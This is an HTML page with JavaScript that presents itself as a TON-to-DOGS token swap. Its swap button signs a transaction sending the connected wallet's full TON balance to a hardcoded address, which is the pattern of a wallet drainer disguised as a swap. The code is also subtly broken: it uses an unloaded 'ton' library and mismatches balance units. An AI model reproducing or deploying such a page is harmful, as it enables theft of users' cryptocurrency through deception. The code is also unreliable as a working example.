<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TON to DOGS Swap</title>
    <script src="https://unpkg.com/@tonconnect/sdk"></script>
</head>
<body>
    <h1>TON to DOGS Swap</h1>
    <button id="connectWalletButton">Connect Wallet</button>
    <button id="swapButton" disabled>Swap TON for DOGS</button>
    <div id="status"></div>

    <script>
        const connector = new TonConnect({
            manifestUrl: 'https://your-app.com/tonconnect-manifest.json'
        });

        const connectWallet = async () => {
            try {
                await connector.connect();
                document.getElementById('connectWalletButton').disabled = true;
                document.getElementById('swapButton').disabled = false;
                document.getElementById('status').innerText = 'Wallet connected.';
            } catch (error) {
                console.error('Error connecting wallet:', error);
                document.getElementById('status').innerText = 'Error connecting wallet.';
            }
        };

        const getTONBalance = async (address) => {
            const client = new ton.TonClient({
                endpoint: 'https://toncenter.com/api/v2/jsonRPC'
            });
            const balance = await client.getBalance(address);
            return ton.fromNano(balance);
        };

        const prepareSwapTransaction = async () => {
            const walletAddress = await connector.account.address;
            const balance = await getTONBalance(walletAddress);

            const swapTransaction = {
                validUntil: Math.floor(Date.now() / 1000) + 600, // 10 minutes validity
                messages: [
                    {
                        address: 'EQBCaX89lCvgOp-jnw3F-Zeqa0ftvxn_CT4fDJu7haiGgPwY', // Replace with the actual contract address
                        amount: balance, // Full TON amount
                        payload: 'te6ccgEBAQEABgAACCiAmCM=', // Example payload, adjust according to your contract
                    },
                ],
            };

            return swapTransaction;
        };

        const executeSwap = async () => {
            const transaction = await prepareSwapTransaction();

            try {
                const result = await connector.sendTransaction(transaction);
                console.log('Transaction sent:', result);
                document.getElementById('status').innerText = 'Transaction sent successfully.';
            } catch (error) {
                console.error('Error sending transaction:', error);
                document.getElementById('status').innerText = 'Error sending transaction.';
            }
        };

        document.getElementById('connectWalletButton').addEventListener('click', connectWallet);
        document.getElementById('swapButton').addEventListener('click', executeSwap);
    </script>
</body>
</html>
